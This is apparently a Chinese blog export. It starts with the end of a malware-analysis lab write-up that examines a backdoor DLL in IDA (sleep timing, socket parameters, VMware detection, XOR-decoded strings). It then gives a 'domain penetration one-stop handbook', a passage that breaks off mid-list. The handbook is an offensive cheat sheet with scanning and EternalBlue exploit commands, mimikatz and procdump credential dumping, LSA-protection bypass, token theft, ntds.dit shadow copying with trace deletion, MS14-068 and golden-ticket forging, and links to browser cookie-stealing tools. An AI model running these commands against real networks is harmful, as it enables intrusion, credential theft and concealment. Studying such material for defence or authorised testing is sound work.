<p>如下就是<code>Dllamin</code>所调用的api函数</p>
<p><code>strncpy</code>、<code>_strnicmp</code>、<code>CreateThread</code>、<code>strlen</code></p>
<p>但是很明显没有显示完全，省略了很多，可以把<code>Recursion depth</code>设置为2</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017105348609.png" alt="image-20211017105348609"></p>
<p>也是一个很大的图啊…放大看吧，太多了，这里就不一一列举了</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017105645298.png" alt="image-20211017105645298"></p>
<h3 id="0x0E-在0x10001358处，有一个对Sleep（一个使用一个包含要睡眠的毫秒数的参数的API函数）的调用。顺着代码往后看，如果这段代码执行，这个程序会睡眠多久？"><a href="#0x0E-在0x10001358处，有一个对Sleep（一个使用一个包含要睡眠的毫秒数的参数的API函数）的调用。顺着代码往后看，如果这段代码执行，这个程序会睡眠多久？" class="headerlink" title="0x0E 在0x10001358处，有一个对Sleep（一个使用一个包含要睡眠的毫秒数的参数的API函数）的调用。顺着代码往后看，如果这段代码执行，这个程序会睡眠多久？"></a>0x0E 在0x10001358处，有一个对Sleep（一个使用一个包含要睡眠的毫秒数的参数的API函数）的调用。顺着代码往后看，如果这段代码执行，这个程序会睡眠多久？</h3><p>先跳后看</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017105852977.png" alt="image-20211017105852977"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:10001341                 mov     eax, off_10019020 ; &quot;[This is CTI]30&quot;</span><br><span class="line">.text:10001346                 add     eax, 0Dh</span><br><span class="line">.text:10001349                 push    eax             ; String</span><br><span class="line">.text:1000134A                 call    ds:atoi</span><br><span class="line">.text:10001350                 imul    eax, 3E8h</span><br><span class="line">.text:10001356                 pop     ecx</span><br><span class="line">.text:10001357                 push    eax             ; dwMilliseconds</span><br><span class="line">.text:10001358                 call    ds:Sleep</span><br><span class="line">.text:1000135E                 xor     ebp, ebp</span><br><span class="line">.text:10001360                 jmp     loc_100010B4</span><br><span class="line">.text:10001360 sub_10001074    endp</span><br></pre></td></tr></table></figure>

<p>从注释<code>[This is CTI]30</code>中可以猜测，睡眠30s</p>
<p>分析下这段汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将 off_10019020 放入寄存器中，向后偏移 0Dh(13d),push eax 入栈，调用 ds:atoi 函数，接着 eax 的值乘 3E8h，  pop ecx 出栈， 再将eax push 入栈， 调用 sleep ，然后 清零 ebp， jmp到loc_100010B4。</span><br><span class="line">很明显，sleep 函数的参数是 eax，跟踪下eax，首先是从off_10019020这里传进来，接着做atoi函数的参数，然后atoi函数的返回值再乘3E8h，push入栈，作为sleep的参数</span><br></pre></td></tr></table></figure>

<p>跳 <code>off_10019020</code></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017111714716.png" alt="image-20211017111714716"></p>
<p>偏移 <code>0Dh</code>后恰好是3，所以入栈的指针指向 3，传进去的值是30，<code>atoi</code>函数是将char函数转化为int型，接着乘 <code>3E8h（1000）</code>，所以<code>push</code>入栈的值是3w，而 <code>slepp</code>函数在Windows里的单位是毫秒，在Linux里的单位是s，所以这里<code>sleep</code>了30s，与最初的猜测也是一致的。</p>
<h3 id="0x0F-在0x10001701处是一个对socket的调用。它的3个参数是什么？"><a href="#0x0F-在0x10001701处是一个对socket的调用。它的3个参数是什么？" class="headerlink" title="0x0F 在0x10001701处是一个对socket的调用。它的3个参数是什么？"></a>0x0F 在0x10001701处是一个对socket的调用。它的3个参数是什么？</h3><p>跳：</p>
<p>看到在 <code>call ds:socket</code>之前，<code>push</code> 了 6/1/2  3个参数</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017112652130.png" alt="image-20211017112652130"></p>
<p>右键单击每个数，选择符号变量</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017120533291.png" alt="image-20211017120533291"></p>
<p>这里列举了ida为这个特定值找到所有的对应常量。</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017120630212.png" alt="image-20211017120630212"></p>
<p>socket函数的原型:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOCKET socket(int af, int type, int protocol);</span><br></pre></td></tr></table></figure>

<p>而常见的创建套接字的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);  //创建TCP套接字</span><br></pre></td></tr></table></figure>

<p>根据入栈规则，先进后出，先找2. 根据注释可以猜测，找对应的<code>AF</code>，所以 <code>2</code>处传递的参数就是 <code>AF_INET</code></p>
<p>接着看1处的参数，在<code>socket</code>中对应的是<code>type</code></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017121841865.png" alt="image-20211017121841865"></p>
<p>最后找6，对应的是<code>protocol</code></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017122002778.png" alt="image-20211017122002778"></p>
<p>所以整个socket函数的传参是这个顺序</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017122125015.png" alt="image-20211017122125015"></p>
<p>这三个参数大致含义:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AF_INET 用于连接连接对象是IPv4时（对应的IPv6用的是 AF_INET6)</span><br><span class="line">SOCK_STREAM 用于连接方式使用TCP时候（对应的UDP对应的是SOCK_DGRAM）</span><br><span class="line">IPPROTO_TCP 用于继续指明传输的方式是TCP（对应的UDP是IPPROTO_UDP）</span><br></pre></td></tr></table></figure>

<p>因此这个 <code>socket</code>会被配置为基于IPV4 的TCP连接（常被用于HTTP）</p>
<p>关于<code>socket</code>函数的更多资料可以去 <code>MSDN</code> 上查</p>
<h3 id="0x10-使用MSDN页面的socket和IDA-pro中的命名符号常量，你能使参数更加有意义吗？在你应用修改之后，参数是什么？"><a href="#0x10-使用MSDN页面的socket和IDA-pro中的命名符号常量，你能使参数更加有意义吗？在你应用修改之后，参数是什么？" class="headerlink" title="0x10 使用MSDN页面的socket和IDA pro中的命名符号常量，你能使参数更加有意义吗？在你应用修改之后，参数是什么？"></a>0x10 使用MSDN页面的socket和IDA pro中的命名符号常量，你能使参数更加有意义吗？在你应用修改之后，参数是什么？</h3><p>emmm,修改的过程就是上文分析的过程吧……</p>
<p>这里附上链接：<a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket">socket function (winsock2.h) - Win32 apps | Microsoft Docs</a></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017145730535.png" alt="image-20211017145730535"></p>
<h3 id="0x11-搜索in指令（opcode-0xED）的使用。这个指令和一个魔术字符串VMXh用来进行VMware的检测。-在这个恶意代码中被使用了吗？使用对执行in指令函数的交叉引用，能发现进一步检测VMware的证据吗？"><a href="#0x11-搜索in指令（opcode-0xED）的使用。这个指令和一个魔术字符串VMXh用来进行VMware的检测。-在这个恶意代码中被使用了吗？使用对执行in指令函数的交叉引用，能发现进一步检测VMware的证据吗？" class="headerlink" title="0x11 搜索in指令（opcode 0xED）的使用。这个指令和一个魔术字符串VMXh用来进行VMware的检测。 在这个恶意代码中被使用了吗？使用对执行in指令函数的交叉引用，能发现进一步检测VMware的证据吗？"></a>0x11 搜索in指令（opcode 0xED）的使用。这个指令和一个魔术字符串VMXh用来进行VMware的检测。 在这个恶意代码中被使用了吗？使用对执行in指令函数的交叉引用，能发现进一步检测VMware的证据吗？</h3><p>搜索 <code>in</code> 指令的话，通过选择菜单的 <code>Search-&gt;Text</code>，然后输入<code>in</code> （或者<code> Search -&gt; Sequence of Bytes</code>，然后搜索 <code>in</code> 指令的 opcode,也就是ED）。</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017151029376.png" alt="image-20211017151029376"></p>
<p>这里的选项建议全部勾选上，不然会产生一堆无用信息。</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017151048294.png" alt="image-20211017151048294"></p>
<p>如果无法快速定位到有用的信息的话，就一个个点开试。直接找<code>in</code>指令，</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017152038722.png" alt="image-20211017152038722"></p>
<p>定位到这里，<code>in</code>指令在的位置是 <code>0x100061c7</code></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017152312343.png" alt="image-20211017152312343"></p>
<p>在 <code>0x100061c7</code>处的<code>mov</code>指令将 <code>0x564D5868</code>赋值给 <code>eax</code>。右键可以看到它相当于 ASCII 字符串 <code>VMXh</code></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017152836872.png" alt="image-20211017152836872"></p>
<p>书上说在<code>交叉引用</code>中可以看到 <code>Found VIrtual MAchine</code> 字符串，但是我没找到……</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017153549370.png" alt="image-20211017153549370"></p>
<h3 id="0x12-将你的光标跳转到0x1001D988处，你发现了什么？"><a href="#0x12-将你的光标跳转到0x1001D988处，你发现了什么？" class="headerlink" title="0x12 将你的光标跳转到0x1001D988处，你发现了什么？"></a>0x12 将你的光标跳转到0x1001D988处，你发现了什么？</h3><p>先跳：</p>
<p>看到是一些巴拉巴拉字符，不具有可读性。</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017154654565.png" alt="image-20211017154654565"></p>
<h3 id="0x13-如果你安装了IDA-Python插件（包裹IDA-Pro的商业版本的插件），运行Lab05-01-py，一个本书中随恶意代码提供的IDA-Pro-Python脚本，（确定光标是在0x1001D988处。）在你运行这个脚本后发生了什么？"><a href="#0x13-如果你安装了IDA-Python插件（包裹IDA-Pro的商业版本的插件），运行Lab05-01-py，一个本书中随恶意代码提供的IDA-Pro-Python脚本，（确定光标是在0x1001D988处。）在你运行这个脚本后发生了什么？" class="headerlink" title="0x13 如果你安装了IDA Python插件（包裹IDA Pro的商业版本的插件），运行Lab05-01.py，一个本书中随恶意代码提供的IDA Pro Python脚本，（确定光标是在0x1001D988处。）在你运行这个脚本后发生了什么？"></a>0x13 如果你安装了IDA Python插件（包裹IDA Pro的商业版本的插件），运行Lab05-01.py，一个本书中随恶意代码提供的IDA Pro Python脚本，（确定光标是在0x1001D988处。）在你运行这个脚本后发生了什么？</h3><p>大概可以看到这个脚本实现的是解密的操作，通过异或。</p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017160806610.png" alt="image-20211017160806610"></p>
<p>加载脚本后，字符串 <code>xdoor is this backdoor </code></p>
<p><img src="/2021/10/30/ida%E5%88%86%E6%9E%90dll/image-20211017161309277.png" alt="image-20211017161309277"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>分析恶意样本的过程是比较枯燥的，地址需要来回跳转，逻辑性要求比较高，还需要对底层汇编很熟悉，笔者是第一次使用ida分析恶意样本，学到了很多，也了解到很多不足，长路慢慢~</p>
]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>木马</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透一条龙手册</title>
    <url>/2022/01/26/Domain-penetration_one-stop/</url>
    <content><![CDATA[<h1 id="1-无凭证情况下"><a href="#1-无凭证情况下" class="headerlink" title="1.无凭证情况下"></a>1.无凭证情况下</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; 							# SMB 扫描存活主机</span><br><span class="line">nmap -sP -p &lt;ip&gt; 							# ping 扫描</span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; 	# 快速扫描</span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; 	# 检测 SMB 漏洞</span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; 						# 经典扫描</span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt;		 			# 全扫描</span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; 						# UDP 扫描</span><br></pre></td></tr></table></figure>



<h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2><p>扫描后可以去先用已知漏洞打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java rmi： exploit/multi/misc/java_rmi_server</span><br><span class="line">ms17-010：exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary/scanner/http/tomcat_enum</span><br><span class="line">jboss manager：exploit/multi/http/tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">		   findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>低权限可以做的事情</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winpeas.exe</span><br><span class="line">查找内容有 password 的文件：findstr /si &#x27;password&#x27; *.txt *.xml *.docx</span><br><span class="line">Juicy Potato / Lovely Potato</span><br><span class="line">PrintSpoofer</span><br><span class="line">RoguePotato</span><br><span class="line">SMBGhost CVE-2020-0796</span><br><span class="line">CVE-2021-36934 (HiveNightmare/SeriousSAM)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>





<h2 id="拥有本地管理员权限"><a href="#拥有本地管理员权限" class="headerlink" title="拥有本地管理员权限"></a>拥有本地管理员权限</h2><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">hashdump: post/windows/gather/smart_hashdump</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#x27;&lt;password&gt;&#x27; --sam / --lsa / --ntds</span><br></pre></td></tr></table></figure>



<h3 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a>绕过LSA防护策略读取密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;!+&quot; &quot;!processprotect /process:lsass.exe /remove&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot;  &quot;sekurlsa::logonpasswords&quot; &quot;!processprotect  /process:lsass.exe&quot; &quot;!-&quot; #with mimidriver.sys </span><br></pre></td></tr></table></figure>



<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line">.\incognito.exe execute -c &quot;&lt;domain&gt;\&lt;user&gt;&quot; powershell.exe</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">impersonate_token &lt;domain&gt;\\&lt;user&gt;</span><br></pre></td></tr></table></figure>

<p>之前粗略分析过 token</p>
<p><a href="https://0range-x.github.io/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/">Token窃取那些事 (0range-x.github.io)</a></p>
<h3 id="查看本地存储的所有密码"><a href="#查看本地存储的所有密码" class="headerlink" title="查看本地存储的所有密码"></a>查看本地存储的所有密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure>



<h3 id="卷影拷贝（获取域控所有hash）"><a href="#卷影拷贝（获取域控所有hash）" class="headerlink" title="卷影拷贝（获取域控所有hash）"></a>卷影拷贝（获取域控所有hash）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diskshadow list shadows all</span><br><span class="line"></span><br><span class="line">mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">管理员权限执行 </span><br><span class="line">vssadmin create shadow /for=C: </span><br><span class="line">利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive </span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive </span><br><span class="line">//导出system.hive文件到注册表 </span><br><span class="line"></span><br><span class="line">vssadmin delete shadows /for=C: /quiet   //删除卷影，隐藏痕迹</span><br></pre></td></tr></table></figure>

<p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/"><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/#vssadmin%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></a></p>
<h3 id="dpapi解密"><a href="#dpapi解密" class="headerlink" title="dpapi解密"></a>dpapi解密</h3><h1 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a>2.内网信息收集</h1><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、用户列表  net user /domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line"></span><br><span class="line">2.进程列表  tasklist /svc</span><br><span class="line">分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line"></span><br><span class="line">3.服务列表	tasklist /svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞]</span><br><span class="line"></span><br><span class="line">4.端口列表	netstat -ano</span><br><span class="line">开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集</span><br><span class="line"></span><br><span class="line">5.补丁列表	systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞</span><br><span class="line"></span><br><span class="line">6.本机共享	smbclient -L ip  </span><br><span class="line">		   net user \\ip\c$</span><br><span class="line">本机共享列表/访问权限 本机访问的域共享/访问权限</span><br><span class="line"></span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure>

<h3 id="8-获取当前用户密码"><a href="#8-获取当前用户密码" class="headerlink" title="8.获取当前用户密码"></a>8.获取当前用户密码</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
<li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li>
<li><a href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></li>
<li><a href="https://github.com/giMini/mimiDbg">mimiDbg</a></li>
<li><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
<li><a href="http://launcher.nirsoft.net/downloads/">NirLauncher )</a></li>
<li><a href="https://github.com/quarkslab/quarkspwdump">quarkspwdump</a></li>
</ul>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul>
<li><a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></li>
<li><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
</ul>
<h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><ul>
<li><a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></li>
<li><a href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></li>
<li><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li>
<li><a href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></li>
<li><a href="https://github.com/QAX-A-Team/BrowserGhost/">BrowserGhost</a></li>
<li><a href="https://github.com/DeEpinGh0st/Browser-cookie-steal">Browser-cookie-steal(窃取浏览器cookie)</a></li>
</ul>
<h4 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h4><p>版本：Navicat 11或12</p>
<p>方法：<a href="https://blog.csdn.net/CCESARE/article/details/104746596">https://blog.csdn.net/CCESARE/article/details/104746596</a></p>
<p>解密脚本：<a href="https://github.com/tianhe1986/FatSmallTools">https://github.com/tianhe1986/FatSmallTools</a></p>
<p><a href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p>
<h4 id="xshell-amp-xftp密码"><a href="#xshell-amp-xftp密码" class="headerlink" title="xshell&amp;xftp密码"></a>xshell&amp;xftp密码</h4><p><a href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p>
<h4 id="mRemoteNG密码"><a href="#mRemoteNG密码" class="headerlink" title="mRemoteNG密码"></a>mRemoteNG密码</h4><p><a href="https://github.com/kmahyyg/mremoteng-decrypt">https://github.com/kmahyyg/mremoteng-decrypt</a></p>
<p><a href="https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</a></p>
<h2 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h2><h3 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h3><ul>
<li>nmap</li>
<li>masscan</li>
<li>zmap</li>
<li>s扫描器</li>
<li>自写脚本</li>
<li>nc</li>
<li>……</li>
</ul>
<h3 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h3><ul>
<li>DMZ</li>
<li>管理网</li>
<li>生产网</li>
<li>测试网</li>
</ul>
<h3 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h3><p>ipconfig：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure>

<p>net</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain ------&gt; 查询域用户</span><br><span class="line">net group /domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表</span><br><span class="line">net view /domain:domainname</span><br></pre></td></tr></table></figure>

<p>dsquery</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; /domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 </span><br></pre></td></tr></table></figure>



<h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul>
<li>NETBIOS 信息收集</li>
<li>SMB 信息收集</li>
<li>空会话信息收集</li>
<li>漏洞信息收集等</li>
</ul>
<h1 id="3-获取域控的方法"><a href="#3-获取域控的方法" class="headerlink" title="3.获取域控的方法"></a>3.获取域控的方法</h1><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 相关阅读:</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/92016.html">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</a></li>
<li><a href="http://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2之四管理Sysvol文件夹</a></li>
<li><a href="https://adsecurity.org/?p=2288">SYSVOL中查找密码并利用组策略首选项</a></li>
<li><a href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></li>
</ul>
<h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure>

<p>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>

<p>相关阅读 :</p>
<ul>
<li><a href="http://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a></li>
<li><a href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></li>
<li><a href="https://adsecurity.org/?p=541">Kerberos的安全漏洞</a></li>
</ul>
<h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 :</p>
<ul>
<li><a href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的SQL Server发现</a></li>
<li><a href="https://adsecurity.org/?p=1508">SPN扫描</a></li>
<li><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描SQLServer的脚本</a></li>
</ul>
<h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentest.com /user:krbtgt</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 </span><br><span class="line">/ticket:adinistrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>

<p>相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3564.html">域服务账号破解实践</a></li>
<li><a href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a></li>
<li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">深刻理解windows安全认证机制ntlm＆Kerberos</a></li>
</ul>
<h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别： Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限 银票：伪造TGS，<code>只能访问指定的服务</code> 加密方式不同： Golden Ticket由<code>krbtgt</code>的hash加密 Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=2011">攻击者如何使用Kerberos的银票来利用系统</a></li>
